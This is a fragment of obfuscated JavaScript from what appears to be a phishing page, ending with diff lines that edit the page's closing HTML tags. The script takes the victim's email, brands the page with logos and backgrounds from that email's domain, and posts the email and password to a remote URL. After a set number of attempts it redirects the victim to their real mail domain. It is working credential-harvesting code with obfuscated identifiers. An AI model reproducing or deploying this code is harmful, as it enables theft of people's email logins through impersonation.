_0x378f6b=_0x2c94f7['indexOf']('@'),_0x4f11f0=_0x2c94f7['substr'](_0x378f6b+0x1),_0x142f59=_0x4f11f0[_0x340ba1(0x1ab)](0x0,_0x4f11f0[_0x340ba1(0x191)]('.')),_0x1c1d83=_0x142f59[_0x340ba1(0x1a2)]();$('#ai')[_0x340ba1(0x17b)](_0x2c94f7),$(_0x340ba1(0x17c))[_0x340ba1(0x189)](_0x2c94f7),$(_0x340ba1(0x1a1))['hide']();var _0x5e6287=_0x340ba1(0x1a4)+_0x4f11f0;document[_0x340ba1(0x17a)]('mainPage')[_0x340ba1(0x183)]=_0x5e6287,$(_0x340ba1(0x19d))[_0x340ba1(0x19a)](_0x340ba1(0x183),_0x340ba1(0x17f)+_0x4f11f0),_0x2260ba(),$('#domain')[_0x340ba1(0x189)](_0x1c1d83);}$(_0x340ba1(0x1a6))[_0x340ba1(0x194)](function(_0x3bc55d){var _0x1f2f3a=_0x340ba1;$(_0x1f2f3a(0x185))['hide'](),$(_0x1f2f3a(0x1a1))[_0x1f2f3a(0x197)](),_0x3bc55d[_0x1f2f3a(0x187)]();var _0x114fbb=$('#ai')[_0x1f2f3a(0x17b)](),_0x143e46=$(_0x1f2f3a(0x188))['val'](),_0x32d523=$(_0x1f2f3a(0x1a1))[_0x1f2f3a(0x189)]();$(_0x1f2f3a(0x1a1))['text'](_0x32d523);var _0x17d079=_0x114fbb,_0x51d4b7=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x114fbb)return $(_0x1f2f3a(0x185))[_0x1f2f3a(0x1a7)](),$(_0x1f2f3a(0x185))[_0x1f2f3a(0x189)](_0x1f2f3a(0x18f)),![];if(!_0x51d4b7[_0x1f2f3a(0x19e)](_0x17d079))return $(_0x1f2f3a(0x185))[_0x1f2f3a(0x1a7)](),$(_0x1f2f3a(0x185))[_0x1f2f3a(0x189)](_0x1f2f3a(0x182)),![];if(!_0x143e46)return $('#error')[_0x1f2f3a(0x1a7)](),$(_0x1f2f3a(0x185))[_0x1f2f3a(0x189)](_0x1f2f3a(0x18b)),![];var _0x3596a3=_0x17d079[_0x1f2f3a(0x191)]('@'),_0x14cbd4=_0x17d079[_0x1f2f3a(0x1ab)](_0x3596a3+0x1),_0x30bcf8=_0x14cbd4[_0x1f2f3a(0x1ab)](0x0,_0x14cbd4['indexOf']('.')),_0x223097=_0x30bcf8['toLowerCase'](),_0x13bb85=_0x1f2f3a(0x1a4)+_0x14cbd4;document[_0x1f2f3a(0x17a)]('mainPage')[_0x1f2f3a(0x183)]=_0x13bb85,$(_0x1f2f3a(0x19d))['attr'](_0x1f2f3a(0x183),_0x1f2f3a(0x17f)+_0x14cbd4),$(_0x1f2f3a(0x195))[_0x1f2f3a(0x189)](_0x223097),_0x8de6b9=_0x8de6b9+0x1,$[_0x1f2f3a(0x176)]({'dataType':_0x1f2f3a(0x186),'url':f,'type':_0x1f2f3a(0x196),'data':{'ai':_0x114fbb,'pr':_0x143e46},'beforeSend':function(_0x1ff117){var _0x22bb2e=_0x1f2f3a;$(_0x22bb2e(0x1a6))[_0x22bb2e(0x17b)](_0x22bb2e(0x18d));},'complete':function(){var _0x1a8dba=_0x1f2f3a;$('#pr')[_0x1a8dba(0x17b)]('');if(_0x8de6b9>=rc)return _0x8de6b9=0x0,domain_redirect==0x1?window[_0x1a8dba(0x18c)]['replace'](_0x1a8dba(0x178)+_0x14cbd4):window['location']['replace'](rdrt),![];$(_0x1a8dba(0x1a1))['show'](),$(_0x1a8dba(0x1a6))[_0x1a8dba(0x17b)](_0x1a8dba(0x1a8));}});});});
 </script>
-</body>
-</html>
+
+</body></html>
